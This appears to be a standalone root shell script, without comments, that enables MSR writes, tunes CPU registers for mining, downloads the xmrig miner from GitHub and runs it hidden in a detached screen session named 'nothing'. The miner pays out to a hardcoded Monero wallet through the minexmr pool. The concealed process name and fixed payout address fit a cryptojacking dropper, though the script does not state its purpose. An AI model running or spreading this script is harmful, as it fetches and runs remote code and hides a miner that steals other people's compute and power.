#!/bin/sh -e
apt-get update
apt-get install -y curl msr-tools
MSR_FILE=/sys/module/msr/parameters/allow_writes
export ADDR=49ERscAZekwbCDZ3MqV2rhEwTqx1UbihGFCeSRK7Vsy8f6EA5xH151JRmvhAoV2sta2U9eV6CgeNt7u6jTfQ4WtYGbGQygd

if test -e "$MSR_FILE"; then
	echo on > $MSR_FILE
else
	modprobe msr allow_writes=on
fi

if grep -E 'AMD Ryzen|AMD EPYC' /proc/cpuinfo > /dev/null;
	then
	if grep "cpu family[[:space:]]:[[:space:]]25" /proc/cpuinfo > /dev/null;
		then
			echo "Detected Zen3 CPU"
			wrmsr -a 0xc0011020 0x4480000000000
			wrmsr -a 0xc0011021 0x1c000200000040
			wrmsr -a 0xc0011022 0xc000000401500000
			wrmsr -a 0xc001102b 0x2000cc14
			echo "MSR register values for Zen3 applied"
		else
			echo "Detected Zen1/Zen2 CPU"
			wrmsr -a 0xc0011020 0
			wrmsr -a 0xc0011021 0x40
			wrmsr -a 0xc0011022 0x1510000
			wrmsr -a 0xc001102b 0x2000cc16
			echo "MSR register values for Zen1/Zen2 applied"
		fi
elif grep "Intel" /proc/cpuinfo > /dev/null;
	then
		echo "Detected Intel CPU"
		wrmsr -a 0x1a4 0xf
		echo "MSR register values for Intel applied"
else
	echo "No supported CPU detected"
fi

if arch | grep x86_64 > /dev/null;
	then
        echo "Detected x86_64 assuming linux"
        curl -L https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz -O
        tar -xzf xmrig-6.16.4-linux-x64.tar.gz
elif arch | grep arm64 > /dev/null;
	then
		echo "Detected arch 64 assuming m1 mac"
        curl -L https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-macos-arm64.tar.gz -O
        tar -xzf xmrig-6.16.4-macos-arm64.tar.gz
else
	echo "No supported arch detected"
fi
chmod +x ./xmrig-6.16.4/xmrig
screen -dmS nothing xmrig-6.16.4/xmrig -o pool.minexmr.com:4444 -u $ADDR